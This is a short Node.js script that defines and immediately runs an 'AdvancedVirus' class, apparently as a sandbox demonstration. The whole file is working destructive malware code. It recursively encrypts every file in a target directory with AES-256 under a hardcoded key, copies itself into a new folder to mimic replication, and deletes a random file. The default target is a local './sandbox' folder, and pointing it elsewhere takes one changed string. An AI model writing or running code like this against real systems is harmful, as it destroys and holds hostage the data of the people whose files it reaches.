const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

class AdvancedVirus {
    constructor(targetDirectory) {
        this.targetDirectory = targetDirectory;
        this.encryptionKey = '1234567890abcdef1234567890abcdef'; // 32-byte key
        this.iv = Buffer.from('abcdef9876543210abcdef9876543210', 'hex'); // 16-byte IV
    }

    encryptFiles() {
        console.log("🔴 Advanced Virus: Encrypting files...");
        this._scanAndEncrypt(this.targetDirectory);
        console.log("🔴 Advanced Virus: File encryption completed.\n");
    }

    _scanAndEncrypt(directory) {
        const items = fs.readdirSync(directory);

        items.forEach(item => {
            const itemPath = path.join(directory, item);
            if (fs.lstatSync(itemPath).isDirectory()) {
                this._scanAndEncrypt(itemPath); // Recurse into subdirectories
            } else if (fs.lstatSync(itemPath).isFile()) {
                try {
                    const data = fs.readFileSync(itemPath);
                    const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(this.encryptionKey), this.iv);
                    const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
                    fs.writeFileSync(itemPath, encrypted.toString('hex')); // Save encrypted data as hex
                    console.log(`💥 Encrypted: ${itemPath}`);
                } catch (error) {
                    console.error(`⚠️ Failed to encrypt: ${itemPath}`, error.message);
                }
            }
        });
    }

    replicate() {
        console.log("🔴 Advanced Virus: Replicating...");
        const parentDir = path.dirname(this.targetDirectory);
        const newDir = path.join(parentDir, 'sandbox_copy');
        fs.mkdirSync(newDir, { recursive: true });
        const virusFile = __filename;
        const newVirusPath = path.join(newDir, path.basename(virusFile));
        fs.copyFileSync(virusFile, newVirusPath);
        console.log(`🦠 Virus replicated to: ${newVirusPath}\n`);
    }

    deleteRandomFile() {
        console.log("🔴 Advanced Virus: Deleting a random file...");
        const allFiles = this._getAllFiles(this.targetDirectory);

        if (allFiles.length > 0) {
            const randomFile = allFiles[Math.floor(Math.random() * allFiles.length)];
            fs.unlinkSync(randomFile);
            console.log(`❌ Deleted: ${randomFile}`);
        } else {
            console.log("⚠️ No files to delete.");
        }

        console.log("🔴 Advanced Virus: Random file deletion completed.\n");
    }

    _getAllFiles(directory) {
        let files = [];
        const items = fs.readdirSync(directory);

        items.forEach(item => {
            const itemPath = path.join(directory, item);
            if (fs.lstatSync(itemPath).isDirectory()) {
                files = files.concat(this._getAllFiles(itemPath)); // Recurse into subdirectories
            } else if (fs.lstatSync(itemPath).isFile()) {
                files.push(itemPath);
            }
        });

        return files;
    }

    execute() {
        this.encryptFiles();
        this.replicate();
        this.deleteRandomFile();
    }
}

// Execute the virus
const targetDir = './sandbox';
fs.mkdirSync(targetDir, { recursive: true });

const virus = new AdvancedVirus(targetDir);
virus.execute();
